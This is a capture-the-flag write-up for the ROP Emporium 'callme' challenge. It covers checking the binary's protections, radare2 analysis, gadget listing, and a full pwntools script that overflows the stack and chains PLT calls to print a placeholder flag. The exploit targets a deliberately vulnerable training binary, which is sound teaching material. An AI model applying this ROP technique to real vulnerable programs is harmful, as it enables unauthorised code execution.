# callme

Reliably make consecutive calls to imported functions. Use some new techniques and learn about the Procedure Linkage Table.

How do you make consecutive calls to a function from your ROP chain that won't crash afterwards? If you keep using the call instructions already present in the binary your chains will eventually fail, especially when exploiting 32 bit binaries. Consider why this might be the case.

The Procedure Linkage Table (PLT) is used to resolve function addresses in imported libraries at runtime, it's worth reading up about it.

## Checking The Binary

```
root@offsec:~/shared# rabin2 -I callme
arch     x86
baddr    0x400000
binsz    11375
bintype  elf
bits     64
canary   false
sanitiz  false
class    ELF64
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    ./
static   false
stripped false
subsys   linux
va       true
```

## Reverse Engineering

You must call *callme_one()*, *callme_two()* and *callme_three()* in that order, each with the arguments 1,2,3 e.g. *callme_one(1,2,3)* to print the flag. The solution here is simple enough, use your knowledge about what resides in the PLT to call the callme_ functions in the above order and with the correct arguments. Don't get distracted by the incorrect calls to these functions made in the binary, they're there to ensure these functions get linked. You can also ignore the .dat files and the encrypted flag in this challenge, they're there to ensure the functions must be called in the correct order.

```
root@offsec:~/shared# ls
callme  encrypted_flag.txt  key1.dat  key2.dat  libcallme.so
root@offsec:~/shared# ls -la
total 44
drwxr-xr-x 7 root root   224 Mar 19 10:58 .
drwx------ 1 root root  4096 Mar 19 11:34 ..
-rwxr-xr-x 1 root root 13360 Aug 28  2017 callme
-rw-r--r-- 1 root root    34 Aug 19  2017 encrypted_flag.txt
-rw-r--r-- 1 root root    16 Aug 19  2017 key1.dat
-rw-r--r-- 1 root root    16 Aug 19  2017 key2.dat
-rwxr-xr-x 1 root root  8584 Aug 28  2017 libcallme.so
root@offsec:~/shared# r2 callme
[0x004018a0]> aaaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[x] Enable constraint types analysis for variables
[0x004018a0]> afl
0x004017c0    3 26           sym._init
0x004017f0    1 6            sym.imp.puts
0x00401800    1 6            sym.imp.printf
0x00401810    1 6            sym.imp.callme_three
0x00401820    1 6            sym.imp.memset
0x00401830    1 6            sym.imp.__libc_start_main
0x00401840    1 6            sym.imp.fgets
0x00401850    1 6            sym.imp.callme_one
0x00401860    1 6            sym.imp.setvbuf
0x00401870    1 6            sym.imp.callme_two
0x00401880    1 6            sym.imp.exit
0x00401890    1 6            sub.__gmon_start_401890
0x004018a0    1 41           entry0
0x004018d0    4 50   -> 41   sym.deregister_tm_clones
0x00401910    4 58   -> 55   sym.register_tm_clones
0x00401950    3 28           sym.__do_global_dtors_aux
0x00401970    4 38   -> 35   entry.init0
0x00401996    1 111          sym.main
0x00401a05    1 82           sym.pwnme
0x00401a57    1 74           sym.usefulFunction
0x00401ac0    4 101          sym.__libc_csu_init
0x00401b30    1 2            sym.__libc_csu_fini
0x00401b34    1 9            sym._fini
[0x004018a0]>
```

As you can see tha symbols are intact and that means we can use the pwntools symbols trick and in the exploit use `binary.symbols.callme_one` instead of direct memory addresses, making it a bit more readable.

## Finding Gadget

We need to put these registers in order:

- 0x1 in the RDI register (First parameter)
- 0x2 in the RSI register (Second parameter)
- 0x3 in the RDX register (Third Parameter)

So the first thing is to use ropper to list all the pop gadgets, as the call pop is used to put the address on top of the stack into the destination register.

```
root@offsec:~/shared# ROPgadget --binary callme --only "pop|ret"
Gadgets information
============================================================
0x0000000000401b1c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401b1e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401b20 : pop r14 ; pop r15 ; ret
0x0000000000401b22 : pop r15 ; ret
0x0000000000401b1b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401b1f : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000401900 : pop rbp ; ret
0x0000000000401ab0 : pop rdi ; pop rsi ; pop rdx ; ret
0x0000000000401b23 : pop rdi ; ret
0x0000000000401ab2 : pop rdx ; ret
0x0000000000401b21 : pop rsi ; pop r15 ; ret
0x0000000000401ab1 : pop rsi ; pop rdx ; ret
0x0000000000401b1d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004017d9 : ret

Unique gadgets found: 14
root@offsec:~/shared#
```

Conveniently on the address `0x00401ab0` there is a `pop rdi; pop rsi; pop rdx; ret;`.

## Exploitation

```python3
#!/usr/bin/env python3
from pwn import *

binary =context.binary = ELF('callme')

io = process(binary.path)
print(io.recv())
io.sendline(cyclic(100))
io.wait()

core = io.corefile
stack = core.rsp

info("Stack pointer: %#x", stack)
pattern = core.read(stack, 4)
info("Looking for pattern: %r", pattern)
offset = cyclic_find(pattern)
info("Offset: " + str(offset))

# pop rdi; pop rsi; pop rdx; ret
parameters = p64(0x00401ab0)
parameters += p64(0x1)
parameters += p64(0x2)
parameters += p64(0x3)

rop_chain = parameters + p64(binary.symbols.callme_one)
rop_chain += parameters + p64(binary.symbols.callme_two)
rop_chain += parameters + p64(binary.symbols.callme_three)

info("ROP Chain: " + str(rop_chain))

# overflow structure = padding + rop chain
overflow = cyclic(offset) + rop_chain
process = binary.process()
print(process.recv().decode())
info('Sending payload...')
process.sendline(overflow)
print(process.recvall().decode())
```

```
t0thkr1s@kali ~/D/callme> python3 exploit.py
[*] '/home/t0thkr1s/Downloads/callme/callme'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RPATH:    b'./'
[+] Starting local process '/home/t0thkr1s/Downloads/callme/callme': pid 6900
b'callme by ROP Emporium'
[*] Process '/home/t0thkr1s/Downloads/callme/callme' stopped with exit code -11 (SIGSEGV) (pid 6900)
[+] Parsing corefile...: Done
[*] '/home/t0thkr1s/Downloads/callme/core.6900'
    Arch:      amd64-64-little
    RIP:       0x401a56
    RSP:       0x7ffc3df78958
    Exe:       '/home/t0thkr1s/Downloads/callme/callme' (0x400000)
    Fault:     0x6161616c6161616b
[*] Stack pointer: 0x7ffc3df78958
[*] Looking for pattern: b'kaaa'
[*] Offset: 40
[*] ROP Chain: b'\xb0\x1a@\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00P\x18@\x00\x00\x00\x00\x00\xb0\x1a@\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00p\x18@\x00\x00\x00\x00\x00\xb0\x1a@\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x10\x18@\x00\x00\x00\x00\x00'
[+] Starting local process '/home/t0thkr1s/Downloads/callme/callme': pid 6903
callme by ROP Emporium
[*] Sending payload...
[+] Receiving all data: Done (77B)
[*] Process '/home/t0thkr1s/Downloads/callme/callme' stopped with exit code 0 (pid 6903)

64bits

Hope you read the instructions...
> ROPE{a_placeholder_32byte_flag!}
```

> ROPE{a_placeholder_32byte_flag!}
